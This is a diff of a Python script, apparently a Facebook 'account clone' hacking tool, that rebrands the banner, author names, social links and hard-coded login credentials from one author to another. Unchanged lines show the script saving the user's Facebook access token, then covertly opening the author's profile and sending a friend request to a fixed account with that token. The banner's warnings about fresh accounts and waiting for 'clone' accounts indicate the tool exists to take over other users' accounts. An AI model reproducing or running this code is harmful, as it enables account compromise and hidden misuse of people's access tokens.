@@ -50,30 +50,27 @@ def jalan(z):
 logo = """ ★★●═════⚀●☆●☆●⚀══════●★★★★●═════⚀●☆●☆●⚀══════●★★
 ★●═════⚀●☆●☆●⚀══════●★★★★★★★★★★★★★★★★●═════⚀●☆●☆●⚀══════●★
 
-★●═════⚀●☆●☆●⚀══════●★NASEER MEMON - OFFICIAL★●═════⚀●☆●☆●⚀══════●★
+★●═════⚀●☆●☆●⚀══════●★USMAN ALI - OFFICIAL★●═════⚀●☆●☆●⚀══════●★
 
-★●═════⚀●☆●☆●⚀══════●★~~~SYCO - BRAND~~~★●═════⚀●☆●☆●⚀══════●★
+★●═════⚀●☆●☆●⚀══════●★~~~HACKER - BRAND~~~★●═════⚀●☆●☆●⚀══════●★
 
-★●═════⚀●☆●☆●⚀══════●★~~~TheWorldHackerNaseer~~★●═════⚀●☆●☆●⚀══════●★
+★●═════⚀●☆●☆●⚀══════●★~~~TheWorldHackerMrUsman~~★●═════⚀●☆●☆●⚀══════●★
  
- __    __   ______    ______   ________  ________  _______  
-|  \  |  \ /      \  /      \ |        \|        \|       \ 
-| $$\ | $$|  $$$$$$\|  $$$$$$\| $$$$$$$$| $$$$$$$$| $$$$$$$\
-| $$$\| $$| $$__| $$| $$___\$$| $$__    | $$__    | $$__| $$
-| $$$$\ $$| $$    $$ \$$    \ | $$  \   | $$  \   | $$    $$
-| $$\$$ $$| $$$$$$$$ _\$$$$$$\| $$$$$   | $$$$$   | $$$$$$$\
-| $$ \$$$$| $$  | $$|  \__| $$| $$_____ | $$_____ | $$  | $$
-| $$  \$$$| $$  | $$ \$$    $$| $$     \| $$     \| $$  | $$
- \$$   \$$ \$$   \$$  \$$$$$$  \$$$$$$$$ \$$$$$$$$ \$$   \$$
-                                                           
-   Warning: Don't use your personal account.                                             
+██╗░░░██╗░██████╗███╗░░░███╗░█████╗░███╗░░██╗
+██║░░░██║██╔════╝████╗░████║██╔══██╗████╗░██║
+██║░░░██║╚█████╗░██╔████╔██║███████║██╔██╗██║
+██║░░░██║░╚═══██╗██║╚██╔╝██║██╔══██║██║╚████║
+╚██████╔╝██████╔╝██║░╚═╝░██║██║░░██║██║░╚███║
+░╚═════╝░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
+                                                     
+      Warning: Don't use your personal account.                                             
      Warning: Use a Fresh Account to log in safely.
      Warning: Wait 20 minutes to get clone Account.
 \033[1;91m★★●═════⚀●☆●☆●⚀══════●★★★★●═════⚀●☆●☆●⚀══════●★★
-\033[1;96mAuthor  \033[1;93m: \033[1;92mNASEER MEMON
+\033[1;96mAuthor  \033[1;93m: \033[1;92mUSMAN ALI
 \033[1;96mInstagram \033[1;93m: \033[1;itx_muskan_yr
-\033[1;96mFacebook  \033[1;93m: \033[1; Naseer Memon
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/KillerBoy1/TheWorldHackerNaseer
+\033[1;96mFacebook  \033[1;93m: \033[1; USMAN ALI
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/KillerBoy1/TheWorldHackerMrUsman
 \033[1;91m★★●═════⚀●☆●☆●⚀══════●★★World Hacker★★●═════⚀●☆●☆●⚀══════●★★"""
 
 def tik():
@@ -93,16 +90,16 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print "\033[1;96m★★●═════⚀●☆●☆●⚀══════●★★World Hacker★★●═════⚀●☆●☆●⚀══════●★★    "
-print  """\033[1;91m★★●═════⚀●☆●☆●⚀══════●★★★★●═════⚀●☆●☆●⚀══════●★★
-\033[1;96mAuthor  \033[1;93m: \033[1;92mNASEER MEMON
+print  """\033[1;91m★★●═════⚀●☆●☆●⚀══════●★★MrUsman-Ali★★●═════⚀●☆●☆●⚀══════●★★
+\033[1;96mAuthor  \033[1;93m: \033[1;92mUSMAN ALI
 \033[1;96mInstagram \033[1;93m: \033[1;92mitx_muskan_yr
-\033[1;96mFacebook  \033[1;93m: \033[1;92m Naseer.Memon
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/KillerBoy1/TheWorldHackerNaseer
-\033[1;91m★★●═════⚀●☆●☆●⚀══════●★★★★●═════⚀●☆●☆●⚀══════●★★"""
+\033[1;96mFacebook  \033[1;93m: \033[1;92m Usman Ali
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/KillerBoy1/TheWorldHackerMrUsman
+\033[1;91m★★●═════⚀●☆●☆●⚀══════●★★Usman-Ali★★●═════⚀●☆●☆●⚀══════●★★"""
 print " \x1b[1;93m★★●═════⚀●☆●☆●⚀══════●★★Worls Hacker★★●═════⚀●☆●☆●⚀══════●★★"
 
-CorrectUsername = "naseer"
-CorrectPassword = "memon"
+CorrectUsername = "Usman"
+CorrectPassword = "Ali"
 
 loop = 'true'
 while (loop == 'true'):
@@ -158,7 +155,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/komail.khan.3781')
+				os.system('xdg-open https://www.Facebook.com/ishmail.beene')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
